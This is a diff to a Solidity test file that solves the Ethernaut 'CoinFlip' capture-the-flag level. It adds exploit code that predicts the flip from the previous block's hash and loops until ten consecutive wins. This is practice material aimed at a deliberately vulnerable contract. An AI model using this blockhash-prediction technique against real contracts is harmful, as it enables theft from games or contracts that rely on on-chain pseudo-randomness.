@@ -5,9 +5,11 @@ pragma experimental ABIEncoderV2;
 import "./utils/BaseTest.sol";
 import "../src/levels/CoinFlip.sol";
 import "../src/levels/CoinFlipFactory.sol";
+import "@openzeppelin/contracts/math/SafeMath.sol";
 
 contract TestCoinFlip is BaseTest {
     CoinFlip private level;
+    using SafeMath for uint256;
 
     constructor() public {
         // SETUP LEVEL FACTORY
@@ -29,22 +31,23 @@ contract TestCoinFlip is BaseTest {
         levelAddress = payable(this.createLevelInstance(true));
         level = CoinFlip(levelAddress);
 
-        // Check that the contract is correctly setup
-        assertEq(level.owner(), address(levelFactory));
     }
 
     function exploitLevel() internal override {
         /** CODE YOUR EXPLOIT HERE */
 
         vm.startPrank(player, player);
-        vm.roll(1);
+        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
-        console.log("blockNumber", block.number);
-        while (level.consecutiveWins < 10) {
-            level.flip(false);
+        while (level.consecutiveWins() < 10) {
+            uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+            uint256 coinFlip = blockValue.div(factor);
+            level.flip(coinFlip == 1 ? true : false);
+
+            utilities.mineBlocks(1);
         }
 
-        assertEq(instance.consecutiveWins(), 10);
+        assertEq(level.consecutiveWins(), 10);
 
         vm.stopPrank();
     }
